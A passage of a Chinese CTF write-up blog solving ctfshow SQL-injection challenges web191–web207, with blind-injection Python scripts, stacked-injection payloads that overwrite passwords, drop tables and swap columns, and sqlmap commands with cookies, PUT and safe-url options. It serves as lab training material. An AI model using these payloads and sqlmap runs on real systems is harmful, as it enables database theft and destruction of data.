class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure>

<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>本题过滤了ASCII，可以继续web190的0x01</p>
<h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://42161408-1017-4aef-83ce-c22452b3d107.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><p>官方的思路是希望用ASCII改成ord来写脚本的，这里学一下两个的区别，脚本就直接贴了</p>
<p>ORD() 函数返回字符串第一个字符的ASCII 值，如果该字符是一个多字节（即一个或多个字节的序列），则MySQL函数将返回最左边字符的代码。如果字符不是多字节字符，则ORD()和ASCII()函数返回相似的结果；如果字符是多字节字符，则ASCII()只返回该字符最左侧的一个字节的ASCII值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://60a3f535-f0c5-40d6-9e63-fe058bf95762.challenge.ctf.show/api/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span>+<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == mid):<br>            flag += <span class="hljs-built_in">chr</span>(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_web</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#ctfshow_fl0g</span><br>        <span class="hljs-comment">#payload = &quot;admin&#x27;and (ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#id,f1ag</span><br>        payload = <span class="hljs-string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:payload,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-number">0</span>,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid <br></code></pre></td></tr></table></figure>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>本题多过滤了ord和hex函数，还是可以继续用上面的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://6fec3a09-c862-4062-9893-f46b784267f2.challenge.ctf.show/api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_fl0g\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_fl0g&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(substr((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>这题过滤了substr，问题不大，用left，right或者mid就可以了，flag换到了<code>ctfshow_flxg</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://8a35e846-e2ed-464b-9843-19e404a9158d.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>多过滤了char|left|right|substring这些，上题的脚本继续用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://5d33d7d6-6708-4e4a-82ed-38708c8d1276.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="hljs-variable">$username</span>))<br></code></pre></td></tr></table></figure>

<p>这题又限制的比较死了，本题开始用堆叠注入，反引号利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;update`ctfshow_user`<span class="hljs-built_in">set</span>`pass`=1&amp;password=1<br></code></pre></td></tr></table></figure>

<p>然后使用,抓包得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1&amp;password=0<br></code></pre></td></tr></table></figure>

<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>本题的题目中标明了select已经被过滤了，但是实际上并没有被过滤，orz出题人的问题吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1;<span class="hljs-keyword">select</span>(1)<br></code></pre></td></tr></table></figure>

<p>执行 <code>select(1)</code> 使记录返回1所以前面的 select pass 就被顶掉。如果不是堆叠注入的话, 需要让前面报错 (即查不到结果), 这样才能返回 union 后的查询内容</p>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;show tables&amp;password=ctfshow_user<br></code></pre></td></tr></table></figure>

<p>根据给的语法，如果前面执行就会爆出所有的表，其中肯定有表是<code>ctfshow_user</code>，利用这点进行绕过</p>
<h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><p>可以进行删表另建的方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> ctfshow_user;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ctfshow_user(username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),pass <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-keyword">insert</span> ctfshow_user <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><p>方法同web197的一样</p>
<h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><p>本题过滤了drop和create,可以考虑进行列名互换将username和pass进行互换</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure>

<p>这里引入了一个第三值进行交换，类似算法里那种简单的互换，然后（userAUTO是已知的前面题目都有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=0&amp;password=userAUTO<br></code></pre></td></tr></table></figure>

<h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><p>方法同web197</p>
<h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` text;<br></code></pre></td></tr></table></figure>

<p>然后的同上一题</p>
<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>增加了逗号的过滤，不影响做题，做法同web199。</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>从201开始进行sqlmap的教学</p>
<p>先随便输入一个数字，看一下网络的具体回显，对应具体的接口是在&#x2F;api&#x2F;?id&#x3D;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show --dbs<br></code></pre></td></tr></table></figure>

<p>先爆个库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure>

<p>对应进行爆表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -t ctfshow_user --dump<br></code></pre></td></tr></table></figure>

<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>提示调整请求方式，那应该就是post</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show --dbs<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure>

<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>使用–method 调整sqlmap的请求方式</p>
<p>指定<code>--method=PUT</code>方法，同时加上<code>-headers=&quot;Content-Type:text/plain</code>，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> --dbs<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web --tables <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p> 使用–cookie 提交cookie数据，加了一层这样的限制</p>
<p>看cookie可以先输入一个1，然后看网络回显，或者就是抓包看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> --dbs  <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>api调用需要鉴权</p>
<p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-22195210.png" srcset="/img/loading.gif" lazyload alt="2024-09-22195210"></p>
<p>可以看到需要先请求api&#x2F;getToken.php才能正常的发送</p>
<p>因此需要设置两个参数</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">--safe-url 设置在测试目标地址前访问的安全链接<br>--safe-freq 设置两次注入测试前访问安全链接的次数<br></code></pre></td></tr></table></figure>

<p>这两个选项组合使用，可以有效应对基于会话、验证码或者防护机制的 Web 应用环境中的注入攻击。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web --tables<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flax -dump<br></code></pre></td></tr></table></figure>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p> sql需要闭合，等于没变化，sqlmap默认闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv -dump<br></code></pre></td></tr></table></figure>

<p>中间有跳步骤，我只粘贴刚开始和最后的脚本</p>
<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><p>从这里我从虚拟机换成了wsl，所以命令会稍微有点不同，主要是方便改脚本</p>
<p>–tamper 的初体验</p>
<p><code>--tamper</code> 是 SQLMap 工具中的一个选项，主要用于绕过 WAF（Web应用防火墙）或其他防护机制。通过 <code>--tamper</code> 选项，SQLMap 可以应用自定义的脚本对 SQL 注入的 payload 进行修改，使其不容易被检测到。具体来说，<code>--tamper</code> 的功能是对生成的 SQL 语句进行轻微的修改.</p>
